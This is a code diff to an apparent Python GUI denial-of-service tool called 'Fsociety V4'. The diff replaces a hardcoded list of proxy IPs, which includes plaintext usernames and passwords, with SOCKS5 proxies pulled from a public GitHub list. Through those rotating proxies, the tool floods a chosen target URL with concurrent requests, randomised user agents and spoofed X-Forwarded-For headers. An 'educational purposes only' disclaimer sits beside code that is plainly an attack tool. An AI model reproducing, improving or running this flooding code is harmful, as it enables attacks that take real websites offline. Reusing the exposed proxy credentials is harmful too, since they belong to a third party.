@@ -12,6 +12,12 @@ from PyQt5.QtGui import QPixmap
 from PyQt5.QtCore import QThread, pyqtSignal, Qt
 from io import BytesIO
 
+try:
+    import aiohttp_socks
+except ImportError:
+    print("Please install aiohttp-socks: pip install aiohttp-socks")
+    sys.exit(1)
+
 # Legal disclaimer
 print("WARNING: This tool is for educational purposes only.")
 print("Unauthorized use for attacking targets without permission is illegal.")
@@ -50,19 +56,7 @@ UserAgents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0"
 ]
 
-# Custom proxy list with credentials
-PROXIES = [
-    "23.95.150.145:6114:nwzwjbye:t63tczwl2s7u",
-    "198.23.239.134:6540:nwzwjbye:t63tczwl2s7u",
-    "45.38.107.97:6014:nwzwjbye:t63tczwl2s7u",
-    "207.244.217.165:6712:nwzwjbye:t63tczwl2s7u",
-    "107.172.163.27:6543:nwzwjbye:t63tczwl2s7u",
-    "104.222.161.211:6343:nwzwjbye:t63tczwl2s7u",
-    "64.137.96.74:6641:nwzwjbye:t63tczwl2s7u",
-    "216.10.27.159:6837:nwzwjbye:t63tczwl2s7u",
-    "136.0.207.84:6661:nwzwjbye:t63tczwl2s7u",
-    "142.147.128.93:6593:nwzwjbye:t63tczwl2s7u"
-]
+PROXY_LIST_URL = "https://raw.githubusercontent.com/ebrasha/abdal-proxy-hub/refs/heads/main/socks5-proxy-list-by-EbraSha.txt"
 
 class AttackThread(QThread):
     log_signal = pyqtSignal(str)
@@ -75,43 +69,61 @@ class AttackThread(QThread):
         self.num_requests = num_requests
         self.is_running = True
 
+    async def fetch_proxies(self):
+        async with aiohttp.ClientSession() as session:
+            try:
+                async with session.get(PROXY_LIST_URL, timeout=10) as response:
+                    if response.status == 200:
+                        text = await response.text()
+                        proxies = [line.strip() for line in text.splitlines() if line.strip() and ':' in line]
+                        self.log_signal.emit(f"Fetched {len(proxies)} SOCKS5 proxies.")
+                        return proxies
+                    else:
+                        self.log_signal.emit(f"Failed to fetch proxies: Status {response.status}")
+                        return []
+            except Exception as e:
+                self.log_signal.emit(f"Error fetching proxies: {str(e)}")
+                return []
+
     async def test_proxy(self, session, proxy):
         try:
-            ip, port, username, password = proxy.split(':')
-            proxy_url = f"http://{username}:{password}@{ip}:{port}"
+            proxy_url = f"socks5://{proxy}"
             async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
                 if response.status == 200:
                     return proxy
         except Exception:
-            return None
+            pass
+        return None
 
     async def get_working_proxies(self):
+        proxies = await self.fetch_proxies()
+        if not proxies:
+            return []
         async with aiohttp.ClientSession() as session:
-            tasks = [self.test_proxy(session, proxy) for proxy in PROXIES]
+            tasks = [self.test_proxy(session, proxy) for proxy in proxies]
             results = await asyncio.gather(*tasks)
             working_proxies = [p for p in results if p is not None]
-            self.log_signal.emit(f"Found {len(working_proxies)} working proxies out of {len(PROXIES)}.")
+            self.log_signal.emit(f"Found {len(working_proxies)} working SOCKS5 proxies.")
             return working_proxies
 
     async def send_request(self, session, proxy, semaphore):
         if not self.is_running:
             return
         async with semaphore:
-            ip, port, username, password = proxy.split(':')
-            proxy_url = f"http://{username}:{password}@{ip}:{port}"
+            proxy_url = f"socks5://{proxy}"
             headers = {
                 "User-Agent": random.choice(UserAgents),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "Connection": "keep-alive",
-                "X-Forwarded-For": ip,
+                "X-Forwarded-For": proxy.split(':')[0],
             }
             try:
                 async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=10) as response:
                     status = response.status
-                    self.log_signal.emit(f"Attack on {self.target_url} via {ip}:{port} - Status: {status}")
+                    self.log_signal.emit(f"Attack on {self.target_url} via {proxy} - Status: {status}")
             except Exception as e:
-                self.log_signal.emit(f"Error sending request via {ip}:{port}: {str(e)}")
+                self.log_signal.emit(f"Error sending request via {proxy}: {str(e)}")
 
     async def attack(self):
         working_proxies = await self.get_working_proxies()
@@ -145,7 +157,7 @@ class AttackThread(QThread):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Fsociety V4 - Custom Proxy Edition")
+        self.setWindowTitle("Fsociety V4 - SOCKS5 Edition")
         self.setGeometry(200, 200, 600, 600)
         self.setStyleSheet("background-color: #191919; color: white;")
 
